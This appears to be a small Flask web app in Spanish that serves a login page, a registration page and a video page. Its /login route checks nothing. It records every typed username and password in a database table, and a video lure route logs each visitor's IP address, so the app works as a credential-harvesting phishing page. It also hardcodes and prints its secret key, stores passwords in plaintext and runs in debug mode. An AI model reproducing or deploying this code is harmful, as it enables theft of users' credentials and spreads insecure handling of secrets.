from flask import Flask, render_template, request, redirect, url_for,session
from flask_mysqldb import MySQL
import os

app = Flask(__name__)
app.secret_key = 'mi_clave_super_secreta_123'
print("SECRET KEY:", app.secret_key)

# 🔧 CONFIGURA TUS DATOS DE CONEXIÓN AQUÍ
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST')
app.config['MYSQL_PORT'] = int(os.environ.get('MYSQL_PORT'))
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB')
mysql = MySQL(app)

@app.route('/')
def inicio():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    usuario = request.form['usuario']
    contrasena = request.form['contrasena']

    cur = mysql.connection.cursor()
    cur.execute("INSERT INTO accesos (usuario, contrasena) VALUES (%s, %s)", (usuario, contrasena))
    mysql.connection.commit()
    cur.close()

    session['usuario'] = usuario
    return redirect('/menu')
@app.route('/registro')
def registro():
    return render_template('register.html')

@app.route('/registrar', methods=['POST'])
def registrar():
    usuario = request.form['usuario']
    contrasena = request.form['contrasena']

    cur = mysql.connection.cursor()
    try:
        # 🔥 Guardar contraseña tal cual
        cur.execute("INSERT INTO usuarios (usuario, contrasena) VALUES (%s, %s)", (usuario, contrasena))
        mysql.connection.commit()
        cur.close()
        return redirect(url_for('inicio'))
    except:
        cur.close()
        return "<h2>Ese usuario ya existe</h2>"

@app.route('/menu')
def menu():
    return render_template('menu.html')

@app.route('/video')
def video():
    return render_template('video.html')

@app.route('/redirigir_video')
def redirigir_video():
    # Registrar acceso aunque no esté logueado
    ip = request.remote_addr

    cur = mysql.connection.cursor()
    cur.execute("INSERT INTO accesos (usuario, contrasena) VALUES (%s, %s)", ("VISITA_VIDEO", ip))
    mysql.connection.commit()
    cur.close()

    # Si ya inició sesión → ver video real
    if 'usuario' in session:
        return redirect('/ver_video')

    # Si no → login
    return redirect('/')

@app.route('/ver_video')
def ver_video():
    if 'usuario' not in session:
        return redirect('/')
    return render_template('ver_video.html')
if __name__ == '__main__':
    app.run(debug=True)
    
